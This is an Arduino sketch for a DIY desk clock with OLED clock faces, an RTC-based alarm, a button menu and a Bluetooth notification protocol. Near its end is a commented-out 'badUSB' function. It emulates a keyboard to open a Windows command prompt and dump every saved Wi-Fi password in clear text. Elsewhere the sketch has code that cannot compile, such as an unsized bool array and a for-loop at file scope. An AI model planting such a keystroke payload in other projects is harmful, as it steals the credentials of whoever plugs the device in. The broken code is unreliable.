//2021-01-20 menu ui update
//2021-01-20 dual clock
//2021-01-23 alarm
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SH1106.h>
#include <Adafruit_NeoPixel.h>
//#include <Mouse.h>
//#include <Keyboard.h>

#include <SoftwareSerial.h>

#include "RTClib.h"
#include <timer.h>
#include "bitmap.h"

#define BUZZER 12
#define ALARM 13
#define OLED_RESET 7 // not used

#define PIXEL_COUNT 1
#define PIXEL_PIN   6

// --------------------------
#define MORNING_OPEN   8
#define MORNING_CLOSE 10

#define LUNCH_OPEN    13
#define LUNCH_CLOSE   15

#define DINNER_OPEN   20
#define DINNER_CLOSE  23

#define BOXNUMBER      5
// --------------------------
auto timer = timer_create_default();
Adafruit_SH1106 display(OLED_RESET);
Adafruit_NeoPixel strip = Adafruit_NeoPixel(PIXEL_COUNT, PIXEL_PIN, NEO_GRB + NEO_KHZ800);

RTC_DS3231 rtc;

unsigned long prev = 0;
bool colon = false;

char* daysOfTheWeek[] = {
  "Sunday",
  "Monday",
  "Tuesday",
  "Wednesday",
  "Thursday",
  "Friday",
  "Saturday"
};

uint8_t centerX = 64;
uint8_t centerY = 32;
uint8_t Radius = 28;

int     dev_y = 0;
uint8_t dev_m = 0;
uint8_t dev_d = 0;

uint8_t US_h = 0;
uint8_t US_m = 0;
uint8_t US_s = 0;

uint8_t clockStyle = 3;

uint8_t led = 0;
uint8_t laser = 11;
//---------pin setting-----------

/*
    ****BOTTOM*****
    vibe
    xshut
    I2C

    ***TOP***
    AD0
    DP5
    led alarm
    buzzer
    I2C

*/
uint8_t alarm_h = 6;
uint8_t alarm_m = 45;

uint8_t button_up     = 10;
uint8_t button_center =  9;
uint8_t button_down   = 8;

// Toggle On/Off

bool Toggle[];

for (int index = 0; index <= 7;index++){
  Toggle[index] = false;
}

int pointer_menu = 0; //where is pointer

bool once_state = false;
bool menu_state = HIGH;
bool state = false;

int data_box[BOXNUMBER];

bool nontification = false;
bool laser_click = false;

uint8_t git_commit_hour;

// what time is it ?
bool Morning = git_commit_hour < MORNING_CLOSE && git_commit_hour >= MORNING_OPEN;
bool Lunch   = git_commit_hour < LUNCH_CLOSE   && git_commit_hour >= LUNCH_OPEN;
bool Dinner  = git_commit_hour < DINNER_CLOSE  && git_commit_hour >= DINNER_OPEN;

void setup() {
  Serial.begin(115200);             //Serial Debug
  Serial1.begin(9600);              //Bluetooth start !

  centerX = display.width() / 2;    //find center value
  centerY = display.height() / 2;   //find center value
  Radius  = centerY - 2;            //fine rad value

  if (!rtc.begin())
  {
    Serial.println("Couldn't find RTC!");
    Serial.flush();
    abort();
  }

  if (rtc.lostPower())
  {
    // this will adjust to the date and time at compilation
    rtc.adjust(DateTime(F(__DATE__), F(__TIME__)));
  }
  //  rtc.disable32K();

  timer.every(9000, keypower);


  pinMode(button_up, INPUT_PULLUP);
  pinMode(button_center, INPUT_PULLUP);
  pinMode(button_down, INPUT_PULLUP);
  pinMode(BUZZER, OUTPUT);
  pinMode(laser, OUTPUT);;
  pinMode(ALARM, OUTPUT);
  pinMode(PIXEL_PIN, OUTPUT);

  display.begin(SH1106_SWITCHCAPVCC, 0x3C);
  display.setTextColor(WHITE);
  //delay(2000);

  DateTime now = rtc.now();
  dev_y = now.year();
  dev_m = now.month();
  dev_d = now.day();

  //strip.begin();
  //strip.show(); // Initialize all pixels to 'off'

  //colorWipe(strip.Color(0, 0, 0), 0); // set strip off

}

void loop() {

  timer.tick();
  DateTime now = rtc.now();

  // DateTime US (now - TimeSpan(0, 14, 0, 18));
  DateTime US (now - TimeSpan(0, 9, 0, 18)); //UTC
  US_h = US.hour();
  US_m = US.minute();
  US_s = US.second();

  git_commit_hour = now.hour();

  while (digitalRead(button_center) == LOW)menu_state = LOW;
  Delay(100);
  while (digitalRead(button_center) == LOW)menu_state = LOW;

  if (menu_state == LOW) //center check
  {
    state = !state;
    menu_state = HIGH;
  }

  if (state == true)
  {
    pointer_menu = 1;
    while (state == true)
    {
      timer.tick();
      if (LOW == digitalRead(button_up))
      {
        pointer_menu--;
        if (pointer_menu < 0)pointer_menu = 7;
      }
      else if (LOW == digitalRead(button_down))
      {
        pointer_menu++;
        if (pointer_menu > 7)pointer_menu = 0;
      }
      menu();
      //colorWipe(strip.Color(  0, 255,   0), 50); // Green
      //     if (alarm_check(now.hour(),now.minute()) && once_state) {
      //        Serial.println("alarm check and once state true ");
      //      state = false;
      //    break;
      // }
      Delay(100);
    }
  }
  else if (state == false)
  {
    if (LOW == digitalRead(button_up)) {
      Serial.println(clockStyle);
      clockStyle = clockStyle + 1;
      if (clockStyle > 4)clockStyle = 1;
    }
    DispalyClock(now.hour(), now.minute(), now.second() , now.month(), now.day(), now.dayOfTheWeek());
    //colorWipe(strip.Color(  0,   0,   0), 50); // Black/off
    Delay(100);
    if (alarm_check(now.hour(), now.minute()) && once_state) {
      Serial.println("alarm on");
      digitalWrite(ALARM, HIGH);
    }

    //Bluetooth Protocol 구현
    if (Serial1.available()) { //시리얼이 읽은 값이 있다면 - 한번만 실행

      //init
      if (Serial1.read() == '#') { //시작

      }
      int Protocol_1 = Serial1.parseInt();    //Nontification
      //int Protocol_2 = Serial1.parseInt();  //R
      //int Protocol_3 = Serial1.parseInt();  //G
      //int Protocol_4 = Serial1.parseInt();  //B
      //int Protocol_5 = Serial1.parseInt();  //Buzzer

      if (Serial1.read() == '@') { //끝

        //---------------Nontification--------------------

        /*   for (int i = 0; i < BOXNUMBER; i++ ) {
             data[i] = data[i + 1];//밀어내기
           }
           //최신 알람 저장
           data_box[BOXNUMBER - 1] = Serial1.parseInt();
        */
        //ProtoType - 알람이 있는지만 확인

        if (Protocol_1 > 0 ) {
          //          digitalWrite(ALARM, HIGH);
          nontification = true;
        } else {
          nontification = false;
        }
        /*
          //--------------------RGB-----------------------
          int red   = Protocol_2;
          int green = Protocol_3;
          int blue  = Protocol_4;

          // constrain the values to 0 - 255
          red = constrain(red, 0, 255);
          green = constrain(green, 0, 255);
          blue = constrain(blue, 0, 255);

          // fill strip
          colorWipe(strip.Color(red, green, blue), 0);

          //-------------------Buzzer-----------------------

          //  data  = Protocol_5;
          if (Protocol_5 == 1 ) {
          digitalWrite(BUZZER, HIGH);
          } else if (Protocol_5 == 0) {
          digitalWrite(BUZZER, LOW);
          }

          //---------------------Rssi------------------
        */
        //------------send some data back-------------

        Serial1.println("received:"   //앱 -> 디바이스 -> 앱 , 블루투스 값 전송 후 확인
                        + String(Protocol_1)          //Nontification
                        /*            + ","  + String(Protocol_2)   //R
                                    + ","  + String(Protocol_3)   //G
                                    + ","  + String(Protocol_4)   //B
                                    + ","  + String(Protocol_5)   //Buzzer
                        */     );

        Serial.println("received:"      //시리얼 모니터로 앱 -> 디바이스 받은 값 확인
                       + String(Protocol_1)          //Nontification
                       /*        + ","  + String(Protocol_2)   //R
                               + ","  + String(Protocol_3)   //G
                               + ","  + String(Protocol_4)   //B
                               + ","  + String(Protocol_5)   //Buzzer
                       */       );
      }
    }
  }
}
//----------------------------------
void Delay(int delay_time) {  //if you need delay without stop just stay here
  long prev = millis();
  while (millis() - prev < delay_time);//stay here
}

//thank you google !
void showTimePin(int center_x, int center_y, double pl1, double pl2, double pl3) //need display show time pin
{
  double x1, x2, y1, y2;
  double RAD = 3.141592 / 180;
  double LR = 89.99;
  x1 = center_x + (Radius * pl1) * cos((6 * pl3 + LR) * RAD);
  y1 = center_y + (Radius * pl1) * sin((6 * pl3 + LR) * RAD);
  x2 = center_x + (Radius * pl2) * cos((6 * pl3 - LR) * RAD);
  y2 = center_y + (Radius * pl2) * sin((6 * pl3 - LR) * RAD);

  display.drawLine((int)x1, (int)y1, (int)x2, (int)y2, WHITE);
}

//      how to use buzzer
//      digitalWrite(BUZZER, HIGH);
//      digitalWrite(BUZZER, LOW);

//  colorWipe(strip.Color(255,   0,   0), 50); // Red
//  colorWipe(strip.Color(  0, 255,   0), 50); // Green
//  colorWipe(strip.Color(  0,   0, 255), 50); // Blue
//  colorWipe(strip.Color(  0,   0,   0), 50); // Black/off
void colorWipe(uint32_t c, uint8_t wait) {  //led
  for (uint16_t i = 0; i < strip.numPixels(); i++) {
    strip.setPixelColor(i, c);
    strip.show();
    Delay(wait);
  }
}
//boot usb command
/*
  void badUSB() {
  Keyboard.begin();
  delay(500);
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(50);
  Keyboard.press(KEY_LEFT_GUI);
  delay(500);
  Keyboard.press('r');
  delay(500);
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.print("cmd");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(500);
  //Keyboard.print("netsh wlan show profiles");
  Keyboard.print("for /f \"skip=9 tokens=1,2 delims=:\" %i in ('netsh wlan show profiles') do @echo%j | findstr -i -v echo | netsh wlan show profiles %j key=clear");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  Keyboard.end();
  delay(500);
  }*/
void keypower() {//stay operatr
  pinMode(4, OUTPUT);
  digitalWrite(4, LOW);
  delay(500);
  pinMode(4, INPUT);
}
